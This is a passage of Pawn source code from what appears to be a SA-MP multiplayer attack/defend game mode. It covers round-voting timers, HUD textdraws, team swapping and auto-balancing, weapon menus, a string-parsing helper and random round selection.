		else
		{
	        format(iString, sizeof(iString), "%sBase %s(~r~%d%s)", MAIN_TEXT_COLOUR, MAIN_TEXT_COLOUR, Current, MAIN_TEXT_COLOUR);
	    }
	}

	foreach(new i : Player)
		PlayerTextDrawSetString(i, BaseID_VS, iString);
	return 1;
}

forward OnVoteBase();
public OnVoteBase()
{
	if(Current != -1) return 0;
	if(AllowStartBase == false) return 0;
	if(VoteInProgress == false) return 0;

	new iString[128];
    VotingTime--;
	format(iString, sizeof(iString), "%sRound voting has started~n~Time left: ~r~~h~%d %sseconds", MAIN_TEXT_COLOUR, VotingTime, MAIN_TEXT_COLOUR);
	TextDrawSetString(EN_CheckPoint, iString);
	TextDrawShowForAll(EN_CheckPoint);

    if(VotingTime <= 0)
    {
		VoteInProgress = false;

		new GreaterVotesBaseID;
		for(new i = 0; i < MAX_BASES; i++)
		{
			if(i != GreaterVotesBaseID)
			{
				if(VoteCount[i] > VoteCount[GreaterVotesBaseID])
				{
					GreaterVotesBaseID = i;
				}
			}
		}

		AllowStartBase = false;
		SetTimerEx("OnBaseStart", 2000, false, "i", GreaterVotesBaseID);
		format(iString, sizeof(iString), ""COL_PRIM"Voting has ended. System has started Base: {FFFFFF}%s (ID: %d)", BName[GreaterVotesBaseID], GreaterVotesBaseID);
		SendClientMessageToAll(-1, iString);
		VotingTime = 10;
		TextDrawHideForAll(EN_CheckPoint);
		GameType = BASE;
		foreach(new i : Player)
		{
		    if(CanPlay(i)) {
				TogglePlayerControllableEx(i, false);
				Player[i][ToAddInRound] = true;
				Player[i][HasVoted] = false;
			}
		}

  		return 1;
    }

    SetTimer("OnVoteBase",1000,0);
    return 0;
}

forward OnVoteArena();
public OnVoteArena()
{
	if(Current != -1) return 0;
	if(AllowStartBase == false) return 0;
	if(VoteInProgress == false) return 0;

	new iString[128];
    VotingTime--;
	format(iString, sizeof(iString), "%sRound voting has started~n~Time left: ~r~%d %sseconds", MAIN_TEXT_COLOUR, VotingTime, MAIN_TEXT_COLOUR);
	TextDrawSetString(EN_CheckPoint, iString);
	TextDrawShowForAll(EN_CheckPoint);

    if(VotingTime <= 0)
    {
		VoteInProgress = false;

		new GreaterVotesArenaID;
		for(new i = 0; i < MAX_ARENAS; i++)
		{
			if(i != GreaterVotesArenaID)
			{
				if(VoteCount[i] > VoteCount[GreaterVotesArenaID])
				{
					GreaterVotesArenaID = i;
				}
			}
		}

		AllowStartBase = false;
		SetTimerEx("OnArenaStart", 2000, false, "i", GreaterVotesArenaID);
		format(iString, sizeof(iString), ""COL_PRIM"Voting has ended. System has started Arena: {FFFFFF}%s (ID: %d)", AName[GreaterVotesArenaID], GreaterVotesArenaID);
		SendClientMessageToAll(-1, iString);
		VotingTime = 10;
		TextDrawHideForAll(EN_CheckPoint);
		GameType = ARENA;
		foreach(new i : Player)
		{
		    if(CanPlay(i)) {
				TogglePlayerControllableEx(i, false);
				Player[i][ToAddInRound] = true;
				Player[i][HasVoted] = false;
			}
		}

  		return 1;
    }

    SetTimer("OnVoteArena",1000,0);
    return 0;
}



forward OnVoteTDM();
public OnVoteTDM()
{
	if(Current != -1) return 0;
	if(AllowStartBase == false) return 0;
	if(VoteInProgress == false) return 0;

	new iString[128];
    VotingTime--;
	format(iString, sizeof(iString), "%sRound voting has started~n~Time left: ~r~%d %sseconds", MAIN_TEXT_COLOUR, VotingTime, MAIN_TEXT_COLOUR);
	TextDrawSetString(EN_CheckPoint, iString);
	TextDrawShowForAll(EN_CheckPoint);

    if(VotingTime <= 0)
    {
		VoteInProgress = false;

		new GreaterVotesArenaID;
		for(new i = 0; i < MAX_ARENAS; i++)
		{
			if(i != GreaterVotesArenaID)
			{
				if(VoteCount[i] > VoteCount[GreaterVotesArenaID])
				{
					GreaterVotesArenaID = i;
				}
			}
		}

		AllowStartBase = false;
		SetTimerEx("OnArenaStart", 2000, false, "i", GreaterVotesArenaID);
		format(iString, sizeof(iString), ""COL_PRIM"Voting has ended. System has started TDM: {FFFFFF}%s (ID: %d)", AName[GreaterVotesArenaID], GreaterVotesArenaID);
		SendClientMessageToAll(-1, iString);
		VotingTime = 10;
		TextDrawHideForAll(EN_CheckPoint);
		GameType = TDM;
		foreach(new i : Player)
		{
		    if(CanPlay(i)) {
				TogglePlayerControllableEx(i, false);
				Player[i][ToAddInRound] = true;
				Player[i][HasVoted] = false;
			}
		}

  		return 1;
    }

    SetTimer("OnVoteTDM",1000,0);
    return 0;
}

forward HideAnnForAll();
public HideAnnForAll()
{
	TextDrawHideForAll(AnnTD);
}


forward hidew0(playerid);
public hidew0(playerid)
{
	DestroyObject(w0[playerid]);
	GotHit[playerid] = 0;
	return 1;
}

stock CanPlay(playerid)
{
    if(noclipdata[playerid][FlyMode] == true)
		return 0;

    if(!(Player[playerid][Team] == ATTACKER || Player[playerid][Team] == DEFENDER))
		return 0; // can not play

	return 1; // can play
}

stock IsValidSound(soundid) {
	for(new i=0; i < sizeof(ValidSounds); ++i) {
		if(ValidSounds[i] == soundid) return 1;
	}
	return 0;
}

stock HPArmourBaseID_VS_TD(playerid) {
	PlayerTextDrawDestroy(playerid, HPTextDraw_TD);
	PlayerTextDrawDestroy(playerid, ArmourTextDraw);
	PlayerTextDrawDestroy(playerid, BaseID_VS);
	
	DestroyPlayerProgressBar(playerid, HealthBar);
	DestroyPlayerProgressBar(playerid, ArmourBar);

 	HealthBar = CreatePlayerProgressBar(playerid, 547.000000, 67.000000, 64.000000, 6.000000, 0xB4191DFF, 100.000000, BAR_DIRECTION_RIGHT);
	ArmourBar = CreatePlayerProgressBar(playerid, 547.000000, 46.000000, 64.000000, 6.000000, 0xE1E1E1FF, 100.000000, BAR_DIRECTION_RIGHT);
	ShowPlayerProgressBar(playerid, HealthBar);
    ShowPlayerProgressBar(playerid, ArmourBar);

	if(Player[playerid][TextPos] == false) {
		HPTextDraw_TD = CreatePlayerTextDraw(playerid,577, 67.7, "_");
		PlayerTextDrawBackgroundColor(playerid, HPTextDraw_TD, MAIN_BACKGROUND_COLOUR);
		PlayerTextDrawFont(playerid, HPTextDraw_TD, 2);
	    PlayerTextDrawLetterSize(playerid, HPTextDraw_TD, 0.1599, 0.6999);
		PlayerTextDrawColor(playerid, HPTextDraw_TD, 16711935);
		PlayerTextDrawSetOutline(playerid, HPTextDraw_TD, 0);
		PlayerTextDrawSetProportional(playerid, HPTextDraw_TD, 1);
		PlayerTextDrawSetShadow(playerid, HPTextDraw_TD,0);
		PlayerTextDrawAlignment(playerid, HPTextDraw_TD, 2);

		ArmourTextDraw = CreatePlayerTextDraw(playerid,577, 45.7, "_");
		PlayerTextDrawBackgroundColor(playerid, ArmourTextDraw, MAIN_BACKGROUND_COLOUR);
		PlayerTextDrawFont(playerid, ArmourTextDraw, 2);
	    PlayerTextDrawLetterSize(playerid, ArmourTextDraw, 0.1599, 0.6999);
		PlayerTextDrawColor(playerid, ArmourTextDraw, 16711935);
		PlayerTextDrawSetOutline(playerid, ArmourTextDraw, 0);
		PlayerTextDrawSetProportional(playerid, ArmourTextDraw, 1);
		PlayerTextDrawSetShadow(playerid, ArmourTextDraw,0);
		PlayerTextDrawAlignment(playerid, ArmourTextDraw, 2);

	    BaseID_VS = CreatePlayerTextDraw(playerid, 548.000000, 25.000000,"_");
		PlayerTextDrawFont(playerid, BaseID_VS, 1);
		PlayerTextDrawLetterSize(playerid, BaseID_VS, 0.26000, 1.500000);
		PlayerTextDrawBackgroundColor(playerid, BaseID_VS,MAIN_BACKGROUND_COLOUR);
		PlayerTextDrawColor(playerid, BaseID_VS,-65281);
		PlayerTextDrawSetOutline(playerid, BaseID_VS,1);
	    PlayerTextDrawSetProportional(playerid, BaseID_VS, 1);
	    PlayerTextDrawSetShadow(playerid, BaseID_VS,0);
	} else {
		HPTextDraw_TD = CreatePlayerTextDraw(playerid,598, 51, "_");
		PlayerTextDrawBackgroundColor(playerid, HPTextDraw_TD, MAIN_BACKGROUND_COLOUR);
		PlayerTextDrawFont(playerid, HPTextDraw_TD, 2);
	    PlayerTextDrawLetterSize(playerid, HPTextDraw_TD, 0.1599, 0.6999);
		PlayerTextDrawColor(playerid, HPTextDraw_TD, 16711935);
		PlayerTextDrawSetOutline(playerid, HPTextDraw_TD, 0);
		PlayerTextDrawSetProportional(playerid, HPTextDraw_TD, 1);
		PlayerTextDrawSetShadow(playerid, HPTextDraw_TD,0);
		PlayerTextDrawAlignment(playerid, HPTextDraw_TD, 2);

		ArmourTextDraw = CreatePlayerTextDraw(playerid,598, 34, "_");
		PlayerTextDrawBackgroundColor(playerid, ArmourTextDraw, MAIN_BACKGROUND_COLOUR);
		PlayerTextDrawFont(playerid, ArmourTextDraw, 2);
	    PlayerTextDrawLetterSize(playerid, ArmourTextDraw, 0.1599, 0.6999);
		PlayerTextDrawColor(playerid, ArmourTextDraw, 16711935);
		PlayerTextDrawSetOutline(playerid, ArmourTextDraw, 0);
		PlayerTextDrawSetProportional(playerid, ArmourTextDraw, 1);
		PlayerTextDrawSetShadow(playerid, ArmourTextDraw,0);
		PlayerTextDrawAlignment(playerid, ArmourTextDraw, 2);

	    BaseID_VS = CreatePlayerTextDraw(playerid, 575.000000, 19.000000,"_");
		PlayerTextDrawFont(playerid, BaseID_VS, 1);
		PlayerTextDrawLetterSize(playerid, BaseID_VS, 0.26000, 1.500000);
		PlayerTextDrawBackgroundColor(playerid, BaseID_VS,MAIN_BACKGROUND_COLOUR);
		PlayerTextDrawColor(playerid, BaseID_VS,-65281);
		PlayerTextDrawSetOutline(playerid, BaseID_VS,1);
	    PlayerTextDrawSetProportional(playerid, BaseID_VS, 1);
	    PlayerTextDrawSetShadow(playerid, BaseID_VS,0);
	}
	return 1;
}

stock DB_Escape(text[]){
	new
		ret[MAX_INI_ENTRY_TEXT * 2],
		ch,
		i,
		j;
	while ((ch = text[i++]) && j < sizeof (ret))
	{
		if (ch == '\'')
		{
			if (j < sizeof (ret) - 2)
			{
				ret[j++] = '\'';
				ret[j++] = '\'';
			}
		}
		else if (j < sizeof (ret))
		{
			ret[j++] = ch;
		}
		else
		{
			j++;
		}
	}
	ret[sizeof (ret) - 1] = '\0';
	return ret;
}



stock SpawnInAntiLag(playerid) {

	new Pos = random(6);
	SetSpawnInfoEx(playerid, 5, Skin[Player[playerid][Team]], AntiLagSpawn[Pos][0]+random(2), AntiLagSpawn[Pos][1]+random(2), AntiLagSpawn[Pos][2]+0.5, AntiLagSpawn[Pos][3], 0, 0, 0, 0, 0, 0);
	Player[playerid][IgnoreSpawn] = true;
	SpawnPlayerEx(playerid);

	SetPlayerInterior(playerid, 	10);
	SetPlayerVirtualWorld(playerid, 1);

	SetHP(playerid,	100.0);
	SetAP(playerid,	100.0);

    GivePlayerWeapon(playerid, SHOTGUN, 9996);
    GivePlayerWeapon(playerid, SNIPER, 	9996);
    GivePlayerWeapon(playerid, M4, 		9996);
    GivePlayerWeapon(playerid, MP5, 	9996);
	GivePlayerWeapon(playerid, DEAGLE, 	9996);

	SetPlayerTeamEx(playerid, 5);
}

stock TogglePlayerControllableEx(playerid, bool:Set) {
	if(Set == false) Player[playerid][IsFrozen] = true;
	else Player[playerid][IsFrozen] = false;

	TogglePlayerControllable(playerid, Set);
}

stock GetVehicleNeedFlip(vehicleid) {//return 1 if need, 0 if not
    new Float:Quat[2];
    GetVehicleRotationQuat(vehicleid, Quat[0], Quat[1], Quat[0], Quat[0]);
    return (Quat[1] >= 0.60 || Quat[1] <= -0.60);
}


stock GetWeaponID(weaponname[]) {
    for(new i = 0; i < 55; ++i) {
        if(strfind(WeaponNames[i], weaponname, true) != -1)
        return i;
    }
    return -1;
}

stock sscanf(string[], format[], {Float,_}:...)
{
	#if defined isnull
		if (isnull(string))
	#else
		if (string[0] == 0 || (string[0] == 1 && string[1] == 0))
	#endif
		{
			return format[0];
		}
	#pragma tabsize 4
	new
		formatPos = 0,
		stringPos = 0,
		paramPos = 2,
		paramCount = numargs(),
		delim = ' ';
	while (string[stringPos] && string[stringPos] <= ' ')
	{
		stringPos++;
	}
	while (paramPos < paramCount && string[stringPos])
	{
		switch (format[formatPos++])
		{
			case '\0':
			{
				return 0;
			}
			case 'i', 'd':
			{
				new
					neg = 1,
					num = 0,
					ch = string[stringPos];
				if (ch == '-')
				{
					neg = -1;
					ch = string[++stringPos];
				}
				do
				{
					stringPos++;
					if ('0' <= ch <= '9')
					{
						num = (num * 10) + (ch - '0');
					}
					else
					{
						return -1;
					}
				}
				while ((ch = string[stringPos]) > ' ' && ch != delim);
				setarg(paramPos, 0, num * neg);
			}
			case 'h', 'x':
			{
				new
					num = 0,
					ch = string[stringPos];
				do
				{
					stringPos++;
					switch (ch)
					{
						case 'x', 'X':
						{
							num = 0;
							continue;
						}
						case '0' .. '9':
						{
							num = (num << 4) | (ch - '0');
						}
						case 'a' .. 'f':
						{
							num = (num << 4) | (ch - ('a' - 10));
						}
						case 'A' .. 'F':
						{
							num = (num << 4) | (ch - ('A' - 10));
						}
						default:
						{
							return -1;
						}
					}
				}
				while ((ch = string[stringPos]) > ' ' && ch != delim);
				setarg(paramPos, 0, num);
			}
			case 'c':
			{
				setarg(paramPos, 0, string[stringPos++]);
			}
			case 'f':
			{

				new changestr[256], changepos = 0, strpos = stringPos;
				while(changepos < 16 && string[strpos] && string[strpos] != delim)
				{
					changestr[changepos++] = string[strpos++];
    				}
				changestr[changepos] = '\0';
				setarg(paramPos,0,_:floatstr(changestr));
			}
			case 'p':
			{
				delim = format[formatPos++];
				continue;
			}
			case '\'':
			{
				new
					end = formatPos - 1,
					ch;
				while ((ch = format[++end]) && ch != '\'') {}
				if (!ch)
				{
					return -1;
				}
				format[end] = '\0';
				if ((ch = strfind(string, format[formatPos], false, stringPos)) == -1)
				{
					if (format[end + 1])
					{
						return -1;
					}
					return 0;
				}
				format[end] = '\'';
				stringPos = ch + (end - formatPos);
				formatPos = end + 1;
			}
			case 'u':
			{
				new
					end = stringPos - 1,
					id = 0,
					bool:num = true,
					ch;
				while ((ch = string[++end]) && ch != delim)
				{
					if (num)
					{
						if ('0' <= ch <= '9')
						{
							id = (id * 10) + (ch - '0');
						}
						else
						{
							num = false;
						}
					}
				}
				if (num && IsPlayerConnected(id))
				{
					setarg(paramPos, 0, id);
				}
				else
				{
					#if !defined foreach
						#define foreach(%1,%2) for (new %2 = 0; %2 < MAX_PLAYERS; %2++) if (IsPlayerConnected(%2))
						#define __SSCANF_FOREACH__
					#endif
					string[end] = '\0';
					num = false;
					new
						name[MAX_PLAYER_NAME];
					id = end - stringPos;
					foreach (Player, playerid)
					{
						GetPlayerName(playerid, name, sizeof (name));
						if (!strcmp(name, string[stringPos], true, id))
						{
							setarg(paramPos, 0, playerid);
							num = true;
							break;
						}
					}
					if (!num)
					{
						setarg(paramPos, 0, INVALID_PLAYER_ID);
					}
					string[end] = ch;
					#if defined __SSCANF_FOREACH__
						#undef foreach
						#undef __SSCANF_FOREACH__
					#endif
				}
				stringPos = end;
			}
			case 's', 'z':
			{
				new
					i = 0,
					ch;
				if (format[formatPos])
				{
					while ((ch = string[stringPos++]) && ch != delim)
					{
						setarg(paramPos, i++, ch);
					}
					if (!i)
					{
						return -1;
					}
				}
				else
				{
					while ((ch = string[stringPos++]))
					{
						setarg(paramPos, i++, ch);
					}
				}
				stringPos--;
				setarg(paramPos, i, '\0');
			}
			default:
			{
				continue;
			}
		}
		while (string[stringPos] && string[stringPos] != delim && string[stringPos] > ' ')
		{
			stringPos++;
		}
		while (string[stringPos] && (string[stringPos] == delim || string[stringPos] <= ' '))
		{
			stringPos++;
		}
		paramPos++;
	}
	do
	{
		if ((delim = format[formatPos++]) > ' ')
		{
			if (delim == '\'')
			{
				while ((delim = format[formatPos++]) && delim != '\'') {}
			}
			else if (delim != 'z')
			{
				return delim;
			}
		}
	}
	while (delim > ' ');
	return 0;
}

stock OnPlayerAmmoUpdate(playerid) {

	if(Player[playerid][Playing] == true) {
	    new weapons;
		new Ammo, TotalShots, Float:accuracy;

		for(new k=2; k < 8; ++k) {
			GetPlayerWeaponData(playerid, k, weapons, Ammo);
			if(Ammo > 10) {
				TotalShots = TotalShots + (9999 - Ammo);
			}
		}

		if(TotalShots == 0) accuracy = 0.0;
		else accuracy = floatmul(100.0, floatdiv(Player[playerid][shotsHit], TotalShots));

		Player[playerid][TotalBulletsFired] = Player[playerid][TotalBulletsFired] + TotalShots;
  		Player[playerid][TotalshotsHit] = Player[playerid][TotalshotsHit] + Player[playerid][shotsHit];
		Player[playerid][Accuracy] = accuracy;
		Player[playerid][TotalAccuracy] += accuracy;
	}

	return 1;
}


stock GetWeaponSlot(weaponid)
{
	new slot;
	switch(weaponid)
	{
		case 0,1: slot = 0;
		case 2 .. 9: slot = 1;
		case 10 .. 15: slot = 10;
		case 16 .. 18, 39: slot = 8;
		case 22 .. 24: slot =2;
		case 25 .. 27: slot = 3;
		case 28, 29, 32: slot = 4;
		case 30, 31: slot = 5;
		case 33, 34: slot = 6;
		case 35 .. 38: slot = 7;
		case 40: slot = 12;
		case 41 .. 43: slot = 9;
		case 44 .. 46: slot = 11;
	}
	return slot;
}

stock ReturnPlayerID(PlayerName[])
{
	new found=0, id;

	foreach(new i : Player) {
		if(strfind(Player[i][Name],PlayerName,true) != -1) {
            found++;
			id = i;
		}
	}

	if(found != 0)
		return id;
	else
		return INVALID_PLAYER_ID;
}

stock ShowTDMWeaponMenu(playerid, team) {
	new iString[512], Title[60];

	switch(team) {
		case ATTACKER: {

		    if(MenuID[playerid] == 1) Title = "{FF0000}Primary Weapon";
		    else if(MenuID[playerid] == 2) Title = "{FF0000}Secondary Weapon";

			format(iString, sizeof(iString), "{FF0000}>> %s\n{FF4444}Desert Eagle\n{FF3333}Shotgun\n{FF4444}Sniper Rifle\n{FF3333}M4\n{FF4444}MP5\n{FF3333}AK-47\n{FF4444}Country Rifle", Title);

		} case DEFENDER: {

		    if(MenuID[playerid] == 1) Title = "{0000FF}Primary Weapon";
		    else if(MenuID[playerid] == 2) Title = "{0000FF}Secondary Weapon";

			format(iString, sizeof(iString), "{0000FF}>> %s\n{4444FF}Desert Eagle\n{3333FF}Shotgun\n{4444FF}Sniper Rifle\n{3333FF}M4\n{4444FF}MP5\n{3333FF}AK-47\n{4444FF}Country Rifle", Title);
		}
	}

	ShowPlayerDialog(playerid,DIALOG_ARENA_GUNS,DIALOG_STYLE_LIST,Title,iString,"Get","Close");

    return 1;
}

stock RemovePlayerWeapon(playerid, weaponid) {
	new plyWeapons[12];
	new plyAmmo[12], armedID;

	for(new slot = 0; slot != 12; slot++)
	{
		new wep, ammo;
		GetPlayerWeaponData(playerid, slot, wep, ammo);

		if(wep != weaponid)
		{
			GetPlayerWeaponData(playerid, slot, plyWeapons[slot], plyAmmo[slot]);
		}
	}

	armedID = GetPlayerWeapon(playerid);

	ResetPlayerWeapons(playerid);
	for(new slot = 0; slot != 12; slot++)
	{
		GivePlayerWeapon(playerid, plyWeapons[slot], plyAmmo[slot]);
	}

	if( armedID != weaponid ) SetPlayerArmedWeapon(playerid,armedID); //give last armedweapon
	else SetPlayerArmedWeapon(playerid,0);//give fist if player armed weapon was knife
}

stock GetCardinalPoint(Float:degree)
{
    // this function return a string that contain the Cardinal point of a heading direction

    new CardinalPoint[20]; //needed string
    // each cardinal point cover 45degree (45 X 8 = 360)
    if(337.5 <= degree <= 360) format(CardinalPoint,sizeof(CardinalPoint),"North");
    else if(0 <= degree <= 22.5) format(CardinalPoint,sizeof(CardinalPoint),"North");
    else if(22.5 <= degree <= 67.5) format(CardinalPoint,sizeof(CardinalPoint),"North East");
    else if(67.5 <= degree <= 112.5) format(CardinalPoint,sizeof(CardinalPoint),"East");
    else if(112.5 <= degree <= 157.5) format(CardinalPoint,sizeof(CardinalPoint),"South East");
    else if(157.5 <= degree <= 202.5) format(CardinalPoint,sizeof(CardinalPoint),"South");
    else if(202.5 <= degree <= 247.5) format(CardinalPoint,sizeof(CardinalPoint),"South West");
    else if(247.5 <= degree <= 292.5) format(CardinalPoint,sizeof(CardinalPoint),"West");
    else if(292.5 <= degree <= 337.5) format(CardinalPoint,sizeof(CardinalPoint),"North West");
    else format(CardinalPoint,sizeof(CardinalPoint),"Error"); // error

    return CardinalPoint;// we return our string
}

stock IsInvalidSkin(id)
{
	switch(id)
	{
	    case 74: return true;
	    case 1: return true;
	    case 2: return true;
	}
	if(id > 299 || id < 0) return true;
	if(id > 264 && id < 273) return true;

	return false;
}


stock SwapTeams()
{
	foreach(new i : Player) {
		if(Player[i][Team] == ATTACKER) Player[i][Team] = DEFENDER;
		else if(Player[i][Team] == ATTACKER_SUB) Player[i][Team] = DEFENDER_SUB;
		else if(Player[i][Team] == DEFENDER) Player[i][Team] = ATTACKER;
        else if(Player[i][Team] == DEFENDER_SUB) Player[i][Team] = ATTACKER_SUB;

		new MyVehicle = -1;
		new Seat;

		if(IsPlayerInAnyVehicle(i)) {
			MyVehicle = GetPlayerVehicleID(i);
			Seat = GetPlayerVehicleSeat(i);
		}

		ColorFix(i);
		SetPlayerSkin(i, Skin[Player[i][Team]]);

		ClearAnimations(i);

		if(MyVehicle != -1) {
		    PutPlayerInVehicle(i, MyVehicle, Seat);

			if(GetPlayerState(i) == PLAYER_STATE_DRIVER) {
				switch(Player[i][Team]) {
					case ATTACKER: ChangeVehicleColor(GetPlayerVehicleID(i), 175, 175);
					case ATTACKER_SUB: ChangeVehicleColor(GetPlayerVehicleID(i), 158, 158);
					case DEFENDER: ChangeVehicleColor(GetPlayerVehicleID(i), 198, 198);
					case DEFENDER_SUB: ChangeVehicleColor(GetPlayerVehicleID(i), 208, 208);
					case REFEREE: ChangeVehicleColor(GetPlayerVehicleID(i), 200, 200);
				}
			}
		}
	}

    for(new i=0; i < SAVE_SLOTS; ++i) {
        if(strlen(SaveVariables[i][pName]) > 2) {
			if(SaveVariables[i][pTeam] == ATTACKER) SaveVariables[i][pTeam] = DEFENDER;
			else if(SaveVariables[i][pTeam] == DEFENDER) SaveVariables[i][pTeam] = ATTACKER;
        }
    }

	new TempScore;
	TempScore = TeamScore[ATTACKER];
	TeamScore[ATTACKER] = TeamScore[DEFENDER];
	TeamScore[DEFENDER] = TempScore;

	new TempName[24], iString[160];
	TempName = TeamName[ATTACKER];
	TeamName[ATTACKER] = TeamName[DEFENDER];
	TeamName[DEFENDER] = TempName;
	TempName = TeamName[ATTACKER_SUB];
	TeamName[ATTACKER_SUB] = TeamName[DEFENDER_SUB];
	TeamName[DEFENDER_SUB] = TempName;

	format(iString, sizeof(iString), "~r~%s %s(~r~%d%s)  ~b~~h~%s %s(~b~~h~%d%s)",TeamName[ATTACKER],MAIN_TEXT_COLOUR,TeamScore[ATTACKER],MAIN_TEXT_COLOUR,TeamName[DEFENDER],MAIN_TEXT_COLOUR,TeamScore[DEFENDER],MAIN_TEXT_COLOUR);
    TextDrawSetString(TeamScoreText, iString);

	format(iString, sizeof(iString), "{FFFFFF}Teams are swapped - {FF0033}Attackers: {FFFFFF}%s | {3344FF}Defenders: {FFFFFF}%s", TeamName[ATTACKER], TeamName[DEFENDER]);
	SendClientMessageToAll(-1, iString);
	FixVsTextDraw();
	return 1;
}

forward DoAutoBalance();
public DoAutoBalance() {
    BalanceTeams();
	if(PreMatchResultsShowing == false) AllowStartBase = true;
	SendClientMessageToAll(-1, ""COL_PRIM"Teams have been auto-balanced.");
}

forward DontAutoBalance();
public DontAutoBalance() {
	if(PreMatchResultsShowing == false) AllowStartBase = true;
}

stock BalanceTeams() {

	new TotalAttackers;
	new TotalDefenders;

	foreach(new i : Player){
		if(Player[i][Spawned] == true && Player[i][InDuel] == false && (Player[i][Team] == ATTACKER || Player[i][Team] == DEFENDER)){
			new tid = random(2);
			if (tid == 0){
				Player[i][Team] = DEFENDER;
			    TotalDefenders++;
			} else if (tid == 1) {
		 		Player[i][Team] = ATTACKER;
			    TotalAttackers++;
			}

			ColorFix(i);
			SetPlayerSkin(i, Skin[Player[i][Team]]);

			ClearAnimations(i);
		}
	}

    new Divisor = floatround((TotalDefenders + TotalAttackers) / 2);

	foreach(new i : Player) {
		if(Player[i][InDuel] == false && (Player[i][Team] == ATTACKER || Player[i][Team] == DEFENDER)) {
			new randomnum = random(2);
			switch(randomnum) {
				case 0: {
		    		if(TotalDefenders <= Divisor) {
		       	 		if(Player[i][Team] == ATTACKER) TotalAttackers--;
						Player[i][Team] = DEFENDER;
		        		TotalDefenders++;

					} else if(TotalAttackers <= Divisor) {
		        		if(Player[i][Team] == DEFENDER) TotalDefenders--;
					 	Player[i][Team] = ATTACKER;
						TotalAttackers++;
					}
				} case 1: {
			    	if(TotalAttackers <= Divisor) {
		        		if(Player[i][Team] == DEFENDER) TotalDefenders--;
					 	Player[i][Team] = ATTACKER;
						TotalAttackers++;

					} else if(TotalDefenders <= Divisor) {
		       	 		if(Player[i][Team] == ATTACKER) TotalAttackers--;
						Player[i][Team] = DEFENDER;
		        		TotalDefenders++;
		    		}
				}
			}
			if(TotalDefenders == TotalAttackers) break;

			ColorFix(i);
			SetPlayerSkin(i, Skin[Player[i][Team]]);

			ClearAnimations(i);
		}
	}
	FixVsTextDraw();
	return 1;
}


stock SwitchTeamFix(playerid) {
    new iString[160];
	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has switched to: {FFFFFF}%s", Player[playerid][Name], TeamName[Player[playerid][Team]]);
	SendClientMessageToAll(-1, iString);

	if(Player[playerid][TextPos] == false) format(iString, sizeof(iString), "~n~~n~%sKills ~r~%d~n~%sDamage ~r~%.0f~n~%sTotal Dmg ~r~%.0f", MAIN_TEXT_COLOUR, Player[playerid][RoundKills], MAIN_TEXT_COLOUR, Player[playerid][RoundDamage], MAIN_TEXT_COLOUR, Player[playerid][TotalDamage]);
	else format(iString, sizeof(iString), "~n~~n~%sKills ~r~%d~n~%sDmg ~r~%.0f~n~%sT. Dmg ~r~%.0f", MAIN_TEXT_COLOUR, Player[playerid][RoundKills], MAIN_TEXT_COLOUR, Player[playerid][RoundDamage], MAIN_TEXT_COLOUR, Player[playerid][TotalDamage]);
	PlayerTextDrawSetString(playerid, RoundKillDmgTDmg, iString);

	ColorFix(playerid);
	FixVsTextDraw();
	SetPlayerSkin(playerid, Skin[Player[playerid][Team]]);
	SetCameraBehindPlayer(playerid);

	if(Current != -1 && TeamHPDamage == true) {
		if(Player[playerid][Team] == ATTACKER || Player[playerid][Team] == ATTACKER_SUB) {
            TextDrawShowForPlayer(playerid, AttackerTeam[0]);
            TextDrawShowForPlayer(playerid, AttackerTeam[1]);
   			TextDrawHideForPlayer(playerid, DefenderTeam[0]);
   			TextDrawHideForPlayer(playerid, DefenderTeam[1]);
		} else if(Player[playerid][Team] == DEFENDER || Player[playerid][Team] == DEFENDER_SUB) {
            TextDrawShowForPlayer(playerid, DefenderTeam[0]);
            TextDrawShowForPlayer(playerid, DefenderTeam[1]);
   			TextDrawHideForPlayer(playerid, AttackerTeam[0]);
   			TextDrawHideForPlayer(playerid, AttackerTeam[1]);
       	} else {
    		TextDrawHideForPlayer(playerid, AttackerTeam[0]);
   			TextDrawHideForPlayer(playerid, AttackerTeam[1]);
   			TextDrawHideForPlayer(playerid, DefenderTeam[0]);
   			TextDrawHideForPlayer(playerid, DefenderTeam[1]);
       	}
	}

	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {
		switch(Player[playerid][Team]) {
			case ATTACKER: ChangeVehicleColor(GetPlayerVehicleID(playerid), 175, 175);
			case ATTACKER_SUB: ChangeVehicleColor(GetPlayerVehicleID(playerid), 158, 158);
			case DEFENDER: ChangeVehicleColor(GetPlayerVehicleID(playerid), 198, 198);
			case DEFENDER_SUB: ChangeVehicleColor(GetPlayerVehicleID(playerid), 208, 208);
			case REFEREE: ChangeVehicleColor(GetPlayerVehicleID(playerid), 200, 200);
		}
	}
}

stock GetTeamWithLessPlayers()
{
    new attacker, defender, TeamID;
    foreach(new i : Player) {
        if(Player[i][Team] == DEFENDER){
            defender++;
        } else if(Player[i][Team] == ATTACKER) {
    		attacker++;
        }
    }
	TeamID = (defender <= attacker) ? DEFENDER : ATTACKER;
    return TeamID;
}



stock DetermineRandomRound(mode = 0, ignore = 0, type = ARENA)
{
 	new roundid, totaltimes=0;

   	Redo:
   	totaltimes++;
  	if(totaltimes > MAX_BASES * MAX_ARENAS) return -1;
	if(type == ARENA) {
		switch(mode) {
		    case 0: {
				roundid = random(TotalArenas+1); // starts both int/ext
			} case 1: {
		 	    roundid = random(TotalArenas+1);
		 	    if(AInterior[roundid] == 0) goto Redo; // starts only int
			} case 2: {
		 	    roundid = random(TotalArenas+1);
		 	    if(AInterior[roundid] != 0) goto Redo; // starts only ext
			}
		}

	 	for(new i=0; i < MAX_ARENAS; i++) {
	 	    if(roundid == RecentArena[i] && ignore != 1) goto Redo;
	 	}
	    if(!AExist[roundid]) goto Redo;

	} else if(type == BASE) {
		switch(mode) {
		    case 0: {
		        roundid = random(TotalBases+1); // starts both int/ext
			} case 1: {
		 	    roundid = random(TotalBases+1);
		 	    if(BInterior[roundid] == 0) goto Redo; // starts only int
		    } case 2: {
		 	    roundid = random(TotalBases+1);
		 	    if(BInterior[roundid] != 0) goto Redo; // starts only ext
		    }
		}

	 	for(new i=0; i < MAX_BASES; i++) {
	 	    if(roundid == RecentBase[i] && ignore != 1) goto Redo;
	 	}
	 	if(!BExist[roundid]) goto Redo;

	}
	return roundid;
}

stock SetRecentRound(roundid, type) {
	switch(type) {
	    case BASE: {
			for(new i = 0; i < MAX_BASES; i++) {
			    if(RecentBase[i] == -1) {
			        RecentBase[i] = roundid;
			        break;
				}
			}
		} case ARENA,TDM: {
		    for(new i = 0; i < MAX_ARENAS; i++) {
		        if(RecentArena[i] == -1) {
		            RecentArena[i] = roundid;
		            break;
				}
			}
		}
	}
}

